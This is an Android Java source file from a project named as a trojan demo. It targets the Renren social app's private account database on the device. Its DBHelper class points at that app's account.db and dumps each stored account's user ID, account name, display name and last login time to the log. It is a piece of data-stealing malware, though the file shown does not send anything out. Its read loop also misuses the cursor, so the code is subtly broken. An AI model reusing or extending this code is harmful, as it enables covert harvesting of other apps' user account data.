package com.singuloid.trojandemo.utils;

import android.app.ProgressDialog;
import android.content.Context;
import android.database.Cursor;
import android.database.DatabaseErrorHandler;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;
import android.util.Log;
import android.widget.Toast;

import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;

/**
 * Created by administrator on 14-9-9.
 */
public class DBHelper extends SQLiteOpenHelper {

    private static final String TAG = "DBHelper";
    private static final String DIR = File.separator + "data" + File.separator + "data" + File.separator;
    private static final String RENREN_DB = DIR + "com.renren.mobile.android" + File.separator + "databases" + File.separator + "account.db";
    private static final String DB_NAME = "account.db";
    private static final String DB_TAL = "account";
    private Context mContext;
    SQLiteDatabase db;
    public DBHelper(Context context) {
        super(context, DB_NAME, null, 1);
        this.mContext = context;
//        db = getWritableDatabase();
    }

    @Override
    public void onCreate(SQLiteDatabase db) {

    }

    @Override
    public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {

    }

    public void queryAccount(SQLiteDatabase db) {
        Cursor cursor = db.query(DB_TAL, new String[]{"uid", "account", "name", "last_login_time"}, null, null, null, null, null);
        if (cursor.moveToFirst()) {
            for (int i = 0; i < cursor.getCount(); i++) {
                cursor.move(i);
                String uid = cursor.getString(cursor.getColumnIndex("uid"));
                String account = cursor.getString(cursor.getColumnIndex("account"));
                String name = cursor.getString(cursor.getColumnIndex("name"));
                String last_login_time = cursor.getString(cursor.getColumnIndex("last_login_time"));
                Log.e(TAG, uid + account + name + last_login_time);
            }
        }
    }


}
